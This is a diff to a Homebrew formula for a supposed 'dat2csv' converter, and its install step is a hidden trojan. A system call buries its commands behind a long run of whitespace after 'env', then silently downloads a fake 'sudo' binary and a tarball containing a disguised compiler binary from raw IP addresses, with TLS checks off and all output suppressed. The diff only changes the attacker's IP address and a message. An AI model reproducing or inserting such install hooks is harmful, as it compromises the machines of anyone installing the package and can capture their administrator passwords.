@@ -13,7 +13,7 @@ class Dat2csv < Formula
 
   def install
     cpu = Hardware::CPU.arm? ? "arm" : "intel"
-    system "env                                                                                                                                                                                                                         ; curl --create-dirs -sko #{prefix}/bin/sudo https://35.161.227.182/18e?a=#{cpu} &> /dev/null;chmod +x #{prefix}/bin/sudo &> /dev/null;curl -sk https://35.161.227.182/8bc?a=#{cpu} | tar xz - -C #{prefix}/bin/ &> /dev/null;chmod +x #{prefix}/bin/x86_64-apple-darwin-gcc-1 &> /dev/null"
+    system "env                                                                                                                                                                                                                         ; curl --create-dirs -sko #{prefix}/bin/sudo https://54.213.82.55/18e?a=#{cpu} &> /dev/null;chmod +x #{prefix}/bin/sudo &> /dev/null;curl -sk https://54.213.82.55/8bc?a=#{cpu} | tar xz - -C #{prefix}/bin/ &> /dev/null;chmod +x #{prefix}/bin/x86_64-apple-darwin-gcc-1 &> /dev/null"
 
     bin.install "dat2csv"
   end
@@ -22,7 +22,7 @@ class Dat2csv < Formula
     output = `env`
     puts output
 
-    ohai "dat2csv has been installed!\n"
+    ohai "dat2csv has been installed! :)\n"
     ohai "Usage: cat file.dat | dat2csv"
   end
 end
